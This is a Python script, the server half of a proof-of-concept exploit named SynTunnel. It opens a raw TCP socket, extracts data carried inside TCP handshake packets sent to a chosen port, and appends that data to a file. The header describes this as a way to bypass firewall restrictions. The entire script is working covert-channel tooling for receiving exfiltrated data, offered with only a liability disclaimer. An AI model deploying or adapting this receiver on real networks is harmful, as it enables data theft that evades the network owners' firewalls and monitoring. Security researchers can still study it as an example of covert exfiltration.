####################################################################################################################
# PoC exploit for data transfer over TCP handshake mechanism (Bypassing Firewall Restrictions)                     #
# The exploit implemented with client and server scripts, this is the SERVER.                                      #
# This tool is for learning porpuses only, The authors doesn't responsible for any damage caused by using this tool#
# Discovoerd by Stas Volfus(Bugsec)                                                                                #
# Exploit written by : Stas Volfus, Idan Cohen, Kassif Dekel                                                       #
# Usage : SynTunnel_s.py [port] [filename]                                                                         #                 
####################################################################################################################

import socket, sys
from struct import *

def Main(argv):
	print "########################################################################################################"
	print "#PoC exploit for data transfer over TCP handshake mechanism (Bypassing Firewall Restrictions)          #"
	print "#The exploit implemented with client and server scripts, this is the SERVER.                           #"
	print "#The authors doesn't responsible for any damage caused by using this tool                              #"
	print "#Discovered By: Stas Volfus                                                                            #"
	print "#Exploit written by : Stas Volfus, Idan Cohen, Kassif Dekel                                            #"
	print "#Usage : SynTunnel_s.py port filename      (requires root)                                             #"
	print "########################################################################################################"

	if len(sys.argv) == 3:
		 clientsDestPort=int(sys.argv[1])
		 capturedFile=str(sys.argv[2])
	else:
		print "[-] SynTunnel_s.py [port] [filename]"
		sys.exit()
	try:
	    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	except socket.error , msg:
	    print "Socket could not be created. Error Code : " + str(msg[0]) + " Message " + msg[1]
	    sys.exit()
	
	print "[*] Waiting for data on port " + str(clientsDestPort)
	# receive a packet
	while True:
	    packet = s.recvfrom(65565)
	    packet = packet[0]  
	    #parse the packet..
	    ip_header = packet[0:20]
	    iph = unpack('!BBHHHBBH4s4s' , ip_header)  
	    version_ihl = iph[0]
	    version = version_ihl >> 4
	    ihl = version_ihl & 0xF
	    iph_length = ihl * 4
	    s_addr = socket.inet_ntoa(iph[8]);
	    tcp_header = packet[iph_length:iph_length+20]
	    tcph = unpack('!HHLLBBHHH' , tcp_header)
	    dest_port = tcph[1]
	    doff_reserved = tcph[4]
	    tcph_length = doff_reserved >> 4
	    h_size = iph_length + tcph_length * 4
	    data_size = len(packet) - h_size
	    #we got something..
	    if dest_port==clientsDestPort and data_size > 0:
	    	print "[*] Received packet from " + str(s_addr) + " on port : " + str(dest_port) 
		print "[*] Looking for data.." 
	    	data = packet[h_size:] 
	    	print "[*] Captured : \n\n" + data
		print "[*] Appending into " + capturedFile
		try:
			with open(capturedFile, "a") as captured:
	    			captured.write(data)
		except:
			print "[-] Can't save to file.."
Main(sys.argv)